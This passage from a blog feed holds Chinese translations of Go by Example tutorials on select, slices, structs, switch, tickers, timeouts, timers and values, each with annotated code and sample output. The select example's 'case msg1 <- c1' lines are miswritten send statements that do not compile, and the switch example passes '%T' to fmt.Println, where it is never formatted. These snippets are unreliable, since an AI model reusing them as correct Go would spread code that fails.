<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义两个管道用来测试`select`</span></span><br><span class="line">    c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每个管道变量在独立的goroutine中隔若干时间后接收到一个值，用来模拟阻塞的RPC调用</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        c1 &lt;- <span class="string">&quot;one&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c2 &lt;- <span class="string">&quot;two&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用`select`同时等待这些管道变量，并且当管道有值时就将其打印出来</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> msg1 &lt;- c1:</span><br><span class="line">                fmt.Println(<span class="string">&quot;received&quot;</span>, msg1)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> msg2 &lt;- c2:</span><br><span class="line">                fmt.Println(<span class="string">&quot;received&quot;</span>, msg2)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ time go run select.go </span><br><span class="line">received one</span><br><span class="line">received two</span><br><span class="line"></span><br><span class="line">//  由于两个睡眠操作是并行执行的，所以执行时间并没有超过3秒</span><br><span class="line">real 0m2.245s</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/select">Go by Example: Select</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Slices</title>
    <url>/2017/07/11/go-by-example-slice/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Slices"><a href="#Go-by-Example-Slices" class="headerlink" title="Go by Example: Slices"></a><center>Go by Example: Slices</center></h2><p>slice(切片)是golang中一个很重要的数据类型，它给序列提供了比数组更加强大的功能接口。</p>
<p>同数组不同，切片只由包含的元素确定，跟元素个数无关。使用内置的make函数可以初始化一个空的切片。</p>
<span id="more"></span>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个长度为3的字符串切片</span></span><br><span class="line">    s := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">3</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;emp&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同数组一样，可以通过索引赋值、取值</span></span><br><span class="line">    s[<span class="number">0</span>] = <span class="string">&quot;a&quot;</span></span><br><span class="line">    s[<span class="number">1</span>] = <span class="string">&quot;b&quot;</span></span><br><span class="line">    s[<span class="number">2</span>] = <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;set:&quot;</span>, s)</span><br><span class="line">    fmt.Println(<span class="string">&quot;get:&quot;</span>, s[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取切片的长度，同数组</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除了上面的基本操作，切片还支持另外一些内置操作，这使得切片比数组要更加强大。</span></span><br><span class="line">    <span class="comment">// 其中一个就是append，可以在切片结尾追加一个或多个元素，并且返回一个新的切片。</span></span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="string">&quot;d&quot;</span>)</span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;apd:&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个内置函数copy，可以将一个切片的值copy到另一个切片。</span></span><br><span class="line">    c := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="built_in">len</span>(s))</span><br><span class="line">    <span class="built_in">copy</span>(c, s)</span><br><span class="line">    fmt.Println(<span class="string">&quot;cpy:&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切片还支持一种特有的语法`slice[low:high]`，可以获取索引值从low到high的切片值。</span></span><br><span class="line">    <span class="comment">// low和high都可以省略，low省略的话默认是0，high省略的话默认是切片最后一个索引值。</span></span><br><span class="line">    l := s[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">    fmt.Println(<span class="string">&quot;sl1:&quot;</span>, l)</span><br><span class="line">    l = s[:<span class="number">5</span>]</span><br><span class="line">    fmt.Println(<span class="string">&quot;sl2:&quot;</span>, l)</span><br><span class="line">    l = s[<span class="number">2</span>:]</span><br><span class="line">    fmt.Println(<span class="string">&quot;sl3:&quot;</span>, l)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以在定义切片的时候初始化赋值。</span></span><br><span class="line">    t := []<span class="type">string</span>&#123;<span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;dcl:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切片也可以用来构建多维的数据结构。而跟多维数组不同，子切片的长度可以不一样。</span></span><br><span class="line">    twoD := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        innerLen := i + <span class="number">1</span></span><br><span class="line">        twoD[i] = <span class="built_in">make</span>([]<span class="type">int</span>, innerLen)</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; innerLen; j++ &#123;</span><br><span class="line">            twoD[i][j] = i + j</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;2d:&quot;</span>, twoD)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run slices.go</span><br><span class="line">emp: [  ]</span><br><span class="line"><span class="built_in">set</span>: [a b c]</span><br><span class="line">get: c</span><br><span class="line">len: 3</span><br><span class="line">apd: [a b c d e f]</span><br><span class="line">cpy: [a b c d e f]</span><br><span class="line">sl1: [c d e]</span><br><span class="line">sl2: [a b c d e]</span><br><span class="line">sl3: [c d e f]</span><br><span class="line">dcl: [g h i]</span><br><span class="line">2d:  [[0] [1 2] [2 3 4]]</span><br></pre></td></tr></table></figure>

<p>更多关于slice的细节推荐Google团队的一篇文章：[Go Slices: usage and internals</p>
<p>](<a href="https://blog.golang.org/go-slices-usage-and-internals">https://blog.golang.org/go-slices-usage-and-internals</a>)</p>
<p>原文链接：<a href="https://gobyexample.com/slices">Go by Example: Slices</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Structs</title>
    <url>/2017/07/28/go-by-example-struct/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Structs"><a href="#Go-by-Example-Structs" class="headerlink" title="Go by Example: Structs"></a><center>Go by Example: Structs</center></h2><p>golang中定义结构体为一系列元素的集合，这对于将数据分组记录很有用。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个结构体，含有name和age两个字段</span></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 实例化一个person结构体</span></span><br><span class="line">    fmt.Println(person&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">20</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以指定字段名赋值进行实例化</span></span><br><span class="line">    fmt.Println(person&#123;name: <span class="string">&quot;Alice&quot;</span>, age: <span class="number">30</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例化为赋值的元素默认为零值</span></span><br><span class="line">    fmt.Println(person&#123;name: <span class="string">&quot;Fred&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印一个指向结构体的指针</span></span><br><span class="line">    fmt.Println(&amp;person&#123;name: <span class="string">&quot;Ann&quot;</span>, age: <span class="number">40</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用.操作符来操作结构体的字段</span></span><br><span class="line">    s := person&#123;name: <span class="string">&quot;Sean&quot;</span>, age: <span class="number">50</span>&#125;</span><br><span class="line">    fmt.Println(s.name)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以使用.操作符操作结构体指针的字段，此时指针会自动取消引用转化为结构体本身</span></span><br><span class="line">    sp := &amp;s</span><br><span class="line">    fmt.Println(sp.age)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构体的值是可变的</span></span><br><span class="line">    sp.age = <span class="number">51</span></span><br><span class="line">    fmt.Println(sp.age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run structs.go</span><br><span class="line">&#123;Bob 20&#125;</span><br><span class="line">&#123;Alice 30&#125;</span><br><span class="line">&#123;Fred 0&#125;</span><br><span class="line">&amp;&#123;Ann 40&#125;</span><br><span class="line">Sean</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/structs">Go by Example: Structs</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Switch</title>
    <url>/2017/07/11/go-by-example-switch/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Switch"><a href="#Go-by-Example-Switch" class="headerlink" title="Go by Example: Switch"></a><center>Go by Example: Switch</center></h2><p>golang也有常用的switch语句。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i := <span class="number">2</span></span><br><span class="line">    fmt.Print(<span class="string">&quot;Write&quot;</span>, i, <span class="string">&quot; as &quot;</span>)</span><br><span class="line">    <span class="comment">// 典型的switch结构</span></span><br><span class="line">    <span class="keyword">switch</span> i &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;one&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;two&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;three&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// case后可以跟多个条件，逗号分隔。也有常用的default。</span></span><br><span class="line">    <span class="keyword">switch</span> time.Now().Weekday() &#123;</span><br><span class="line">        <span class="keyword">case</span> time.Saturday, time.Sunday:</span><br><span class="line">            fmt.Println(<span class="string">&quot;It&#x27;s the weekend&quot;</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;It&#x27;s a weekday&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// switch后不跟条件判断语句可以模仿if/else的功能</span></span><br><span class="line">    t := time.Now()</span><br><span class="line">    <span class="keyword">switch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> t.Hour() &lt; <span class="number">12</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;It&#x27;s before noon&quot;</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;It&#x27;s after noon&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 变量类型判断的switch语句，其中的type是switch独有的用法。</span></span><br><span class="line">    <span class="comment">// 主要用来判断一个interface值的类型。</span></span><br><span class="line">    whatAmI := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> t := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="type">bool</span>:</span><br><span class="line">                fmt.Println(<span class="string">&quot;I&#x27;m a bool&quot;</span>)</span><br><span class="line">            <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">                fmt.Println(<span class="string">&quot;I&#x27;m an int&quot;</span>)</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                fmt.Println(<span class="string">&quot;Don&#x27;t know type %T\n&quot;</span>, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    whatAmI(<span class="literal">true</span>)</span><br><span class="line">    whatAmI(<span class="number">1</span>)</span><br><span class="line">    whatAmI(<span class="string">&quot;hey&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: go run switch.go</span><br><span class="line">Write 2 as two</span><br><span class="line">It<span class="string">&#x27;s a weekday</span></span><br><span class="line"><span class="string">It&#x27;</span>s after noon</span><br><span class="line">I<span class="string">&#x27;m a bool</span></span><br><span class="line"><span class="string">I&#x27;</span>m an int</span><br><span class="line">Don<span class="string">&#x27;t know type string</span></span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/switch">Go by Example: Switch</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Tickers</title>
    <url>/2017/09/05/go-by-example-tikers/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Tickers"><a href="#Go-by-Example-Tickers" class="headerlink" title="Go by Example: Tickers"></a><center>Go by Example: Tickers</center></h2><p><code>Timer</code>是当你想要在未来某个时间只执行一次某个事件时使用，而<code>ticker</code>可以用来以一定时间间隔重复执行一个事件。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Ticker跟Timer是类似的机制:使用管道来通信</span></span><br><span class="line">    <span class="comment">// 下面示例中我们使用内置的for-range语句对于每500毫秒接收到一个的值进行迭代处理 </span></span><br><span class="line">    ticker := time.NewTicker(time.Millisecond * <span class="number">500</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> t := <span class="keyword">range</span> ticker.C &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;Tick at&quot;</span>, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跟Timer一样，Ticker也可以被停止</span></span><br><span class="line">    <span class="comment">// 当Ticker取消时，其相应的管道不会再接收到值</span></span><br><span class="line">    <span class="comment">// 该示例中我们在1600毫秒后停止</span></span><br><span class="line">    time.Sleep(time.Millisecond * <span class="number">1600</span>)</span><br><span class="line">    ticker.Stop()</span><br><span class="line">    fmt.Println(<span class="string">&quot;Ticker stoped&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run ticker.go</span><br><span class="line">Tick at 2017-09-06 11:47:35.512980179 +0800 CST</span><br><span class="line">Tick at 2017-09-06 11:47:36.012186259 +0800 CST</span><br><span class="line">Tick at 2017-09-06 11:47:36.515210336 +0800 CST</span><br><span class="line">Ticker stoped</span><br></pre></td></tr></table></figure>

<p>在执行1600毫秒被停止时Ticker 500毫秒的间隔应该已经重复执行了三次</p>
<p>原文链接：<a href="https://gobyexample.com/tickers">Go by Example: Tickers</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Timeouts</title>
    <url>/2017/08/23/go-by-example-timeout/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Timeouts"><a href="#Go-by-Example-Timeouts" class="headerlink" title="Go by Example: Timeouts"></a><center>Go by Example: Timeouts</center></h2><p>超时对于需要联接外部资源或需要限定执行时间的程序非常重要，在golang中因为存在<code>channel</code>和<code>select</code>使得超时实现起来非常简单。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 通过管道c1模拟一个2s后才有返回值的外部请求</span></span><br><span class="line">    c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c1 &lt;- <span class="string">&quot;result 1&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用select执行一条超时操作</span></span><br><span class="line">    <span class="comment">// res等待管道c1的值，&lt;-time.After(time.Second * 1)等待一个一秒后发送的值。</span></span><br><span class="line">    <span class="comment">// 由于select会执行第一个就绪的条件，所以如果前者执行时间超过后者代码中规定的一秒便会进入后者超时的情况</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> res := &lt;-c1:</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">1</span>):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout1&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于res会在两秒后就绪，小于超时的三秒限制，所以不会超时</span></span><br><span class="line">    c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c2 &lt;- <span class="string">&quot;result 2&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> res := &lt;-c2:</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">3</span>):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout 2&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run timeout.go</span><br><span class="line">timeout1</span><br><span class="line">result 2</span><br></pre></td></tr></table></figure>

<p>使用select结构的超时模式需要借助管道进行通信，这通常是个好主意因为其他一些golang重要的功能也是基于管道和select。</p>
<p>原文链接：<a href="https://gobyexample.com/timeouts">Go by Example: Timeouts</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Timers</title>
    <url>/2017/09/05/go-by-example-timer/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Timers"><a href="#Go-by-Example-Timers" class="headerlink" title="Go by Example: Timers"></a><center>Go by Example: Timers</center></h2><p>我们经常希望golang代码在未来某个时间点执行或者以一定的时间间隔重复执行，golang内置的<code>timer</code>和<code>ticker</code>功能可以轻松实现这两种工作。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Timer类似于未来一个独立的事件，可以告诉它你要等待多久，它会提供一个管道用来在时间点到时发出通知</span></span><br><span class="line">    <span class="comment">// 该例中会等待2秒</span></span><br><span class="line">    timer1 := time.NewTimer(time.Second * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &lt;- timer1.C会一直阻塞直到时间过期管道发送出一个值</span></span><br><span class="line">    &lt;- timer1.C</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">&quot;Timer1 expired&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果只是想等待一段时间，可以使用`time.Sleep`</span></span><br><span class="line">    <span class="comment">// 但使用timer你可以在时间到期前取消，这个也是Sleep做不到的</span></span><br><span class="line">    timer2 := time.NewTimer(time.Second)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        &lt;-timer2.C</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;Timer2 expired&quot;</span>)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用Stop来取消timer</span></span><br><span class="line">    stop2 := timer2.Stop()</span><br><span class="line">    <span class="keyword">if</span> stop2 &#123;</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;Timer2 stopped&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run timer.go</span><br><span class="line">Timer1 expired</span><br><span class="line">Timer2 stopped</span><br></pre></td></tr></table></figure>

<p>第一个timer会在2秒后过期，但是第二个timer在过期前被Stop，所以没有过期</p>
<p>原文链接：<a href="https://gobyexample.com/timers">Go by Example: Timers</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Values</title>
    <url>/2017/07/10/go-by-example-values/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Values"><a href="#Go-by-Example-Values" class="headerlink" title="Go by Example: Values"></a><center>Go by Example: Values</center></h2><p>golang内置有多种基本数据类型，包含字符串、整型、浮点型、布尔型等等。上面是一些基本类型的示例。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 字符串连接</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;go&quot;</span> + <span class="string">&quot;lang&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整数加法</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;1+1 =&quot;</span>, <span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 浮点数除法</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;7.0/3.0 =&quot;</span>, <span class="number">7.0</span>/<span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逻辑运算</span></span><br><span class="line">    fmt.Println(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>)</span><br><span class="line">    fmt.Println(<span class="literal">true</span> || <span class="literal">false</span>)</span><br><span class="line">    fmt.Println(!<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run values.go</span><br><span class="line">golang</span><br><span class="line">1+1 = 2</span><br><span class="line">7.0/3.0 = 2.3333333333333335</span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/values">Go by Example: Values</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Variables</title>
    <url>/2017/07/10/go-by-example-variables/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Variables"><a href="#Go-by-Example-Variables" class="headerlink" title="Go by Example: Variables"></a><center>Go by Example: Variables</center></h2><p>golang中的变量被显式声明，编译时会做类型检查。</p>
